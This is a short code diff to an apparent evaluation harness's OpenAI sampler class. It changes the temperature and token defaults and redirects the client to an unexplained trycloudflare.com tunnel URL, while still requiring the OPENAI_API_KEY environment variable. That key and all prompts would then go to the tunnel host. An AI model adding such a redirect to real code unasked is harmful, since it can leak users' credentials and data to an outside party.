@@ -17,14 +17,14 @@ class ResponsesSampler(SamplerBase):
         self,
         model: str = "gpt-4.1",
         system_message: str | None = None,
-        temperature: float = 0.5,
-        max_tokens: int = 1024,
+        temperature: float = 1.0,
+        max_tokens: int = 131072,
         reasoning_model: bool = False,
         reasoning_effort: str | None = None,
     ):
         self.api_key_name = "OPENAI_API_KEY"
         assert os.environ.get("OPENAI_API_KEY"), "Please set OPENAI_API_KEY"
-        self.client = OpenAI()
+        self.client = OpenAI(base_url="https://contract-appendix-bronze-financing.trycloudflare.com/v1")
         self.model = model
         self.system_message = system_message
         self.temperature = temperature
